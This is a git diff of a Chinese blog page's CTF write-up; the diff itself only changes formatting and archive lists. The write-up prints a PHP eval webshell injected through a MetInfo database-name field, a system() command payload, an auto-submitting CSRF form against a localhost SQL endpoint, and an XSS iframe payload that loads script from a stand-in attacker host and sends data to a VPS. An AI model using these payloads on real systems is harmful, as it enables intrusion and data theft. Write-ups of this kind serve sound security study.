@@ -267,7 +267,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">582</span> / Reading time: <span class="post-count">3 min</span></span>
+                        <span>Word count: <span class="post-count">616</span> / Reading time: <span class="post-count">3 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -406,10 +406,10 @@ height:50vh;
 <p>然后猜测可以跨目录删除文件  (emmmm师傅们的经验真是太丰富了,萌新猜不到22333)</p>
 <p><img src="/2018/07/25/dianfengjike/5.png" alt="dianfengjike"></p>
 <p><img src="/2018/07/25/dianfengjike/6.png" alt="dianfengjike"></p>
-<p>执行命令删除文件后重装metinfo，重装的时候数据库名填：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">met#*/@eval($_GET[1]);/*</span><br></pre></td></tr></table></figure></p>
+<p>执行命令删除文件后重装metinfo，重装的时候数据库名填：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">met#*/@eval($_GET[1]);/*</span><br></pre></td></tr></table></figure></p>
 <p>密码填写为root，这里提一句，由于平台的网络acl问题，所有的环境都是不能外连mysql的，导致会有一点坑。</p>
 <p><img src="/2018/07/25/dianfengjike/7.png" alt="dianfengjike"></p>
-<p>最后getshel拿flag，payload:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.../config.config_db.php?1=system(&quot;cat /tmp/flag&quot;);</span><br></pre></td></tr></table></figure></p>
+<p>最后getshel拿flag，payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.../config.config_db.php?1=system(&quot;cat /tmp/flag&quot;);</span><br></pre></td></tr></table></figure></p>
 <p><img src="/2018/07/25/dianfengjike/8.png" alt="dianfengjike"></p>
 <h2 id="XSS、CSRF-–mysqlonline"><a href="#XSS、CSRF-–mysqlonline" class="headerlink" title="XSS、CSRF –mysqlonline"></a>XSS、CSRF –mysqlonline</h2><p>题目有2个功能: 1.进行数据库的增删改查   2.可以让服务器去请求你输入的url</p>
 <p>第一个功能遍历数据库无果，发现没有重要数据</p>
@@ -419,19 +419,19 @@ height:50vh;
 <p><img src="/2018/07/25/dianfengjike/9.png" alt="dianfengjike"></p>
 <p>然后使用</p>
 <p><img src="/2018/07/25/dianfengjike/10.png" alt="dianfengjike"></p>
-<p>发现XSS成功，选择XSS平台<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://xsspt.com/</span><br></pre></td></tr></table></figure></p>
+<p>发现XSS成功，选择XSS平台<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xsspt.com/</span><br></pre></td></tr></table></figure></p>
 <p>打一下cookie试试，发现返回的referer里有地址</p>
 <p><img src="/2018/07/25/dianfengjike/11.png" alt="dianfengjike"></p>
-<p>但是直接访问无果<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">403: only 127.0.0.1 can find me, so you can get this: http://127.0.0.1/runsql.php</span><br></pre></td></tr></table></figure></p>
+<p>但是直接访问无果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">403: only 127.0.0.1 can find me, so you can get this: http://127.0.0.1/runsql.php</span><br></pre></td></tr></table></figure></p>
 <p><img src="/2018/07/25/dianfengjike/12.png" alt="dianfengjike"></p>
 <p>这里选择xss平台的源码获取</p>
-<p>然后将生成的恶意代码放入以下evil_hex<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">history.pushState('', '', '/')</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1/runsql.php"</span> <span class="attr">name</span> = <span class="string">'form1'</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"sql"</span> <span class="attr">value</span>=<span class="string">"select unhex('evil_hex')"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">    setTimeout("form1.submit();",10);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>则可以得到页面源码<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">403: only 127.0.0.1 can find me, so you can get this: http://127.0.0.1/runsql.php</span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Online Mysql Run<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>Admin Index:<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./static/img/iamsecret_555.jpg"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">I am l3m0n tree.</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>看来flag是<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./static/img/iamsecret_555.jpg</span><br></pre></td></tr></table></figure></p>
+<p>然后将生成的恶意代码放入以下evil_hex<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">history.pushState('', '', '/')</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1/runsql.php"</span> <span class="attr">name</span> = <span class="string">'form1'</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"sql"</span> <span class="attr">value</span>=<span class="string">"select unhex('evil_hex')"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">    setTimeout("form1.submit();",10);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>则可以得到页面源码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">403: only 127.0.0.1 can find me, so you can get this: http://127.0.0.1/runsql.php</span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Online Mysql Run<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>Admin Index:<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./static/img/iamsecret_555.jpg"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">I am l3m0n tree.</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>看来flag是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./static/img/iamsecret_555.jpg</span><br></pre></td></tr></table></figure></p>
 <p>但是直接访问依旧是403</p>
 <p>利用工具<a href="https://github.com/Lz1y/frame2canvas" target="_blank" rel="noopener">https://github.com/Lz1y/frame2canvas</a></p>
 <p>可以获得图片内容</p>
-<p>payload<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;iframe id=&quot;myIframe&quot; src=&quot;admin_zzzz666.php&quot;&gt;&lt;/iframe&gt;&lt;script src=&quot;//atk.com/atk.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe id=&quot;myIframe&quot; src=&quot;admin_zzzz666.php&quot;&gt;&lt;/iframe&gt;&lt;script src=&quot;//atk.com/atk.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
 <p>同样进行16进制编码后放入evil_hex</p>
 <p>然后即可在vps上的监听得到base64</p>
 <p>解码得到</p>
@@ -969,38 +969,6 @@ top:50vh;
     
     
     
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     <div class="total-and-search">
         <div class="total-archive">
         Total : 29
@@ -1013,20 +981,6 @@ top:50vh;
     
     
     
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/07/24/onethinkcms/" >OneThink/Thinkphp 的缓存getshell漏洞</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
     
     <div class="archive-year"> 2018 </div>
     <ul class="year-list">
@@ -1162,6 +1116,29 @@ top:50vh;
         </li>
     
     
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/07/24/onethinkcms/" >OneThink/Thinkphp 的缓存getshell漏洞</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
         <li class="archive-post-item">
             <span class="archive-post-date">05/18</span><a class="archive-post-title" href= "/2018/05/18/rsa/" >Crypto_RSA算法总结</a>
         </li>
@@ -1178,9 +1155,9 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="CTF、漏洞"><span class="iconfont-archer">&#xe606;</span>CTF、漏洞</span>
     
-        <span class="sidebar-tag-name" data-tags="漏洞"><span class="iconfont-archer">&#xe606;</span>漏洞</span>
-    
         <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="漏洞"><span class="iconfont-archer">&#xe606;</span>漏洞</span>
     
         <span class="sidebar-tag-name" data-tags="learn"><span class="iconfont-archer">&#xe606;</span>learn</span>
     
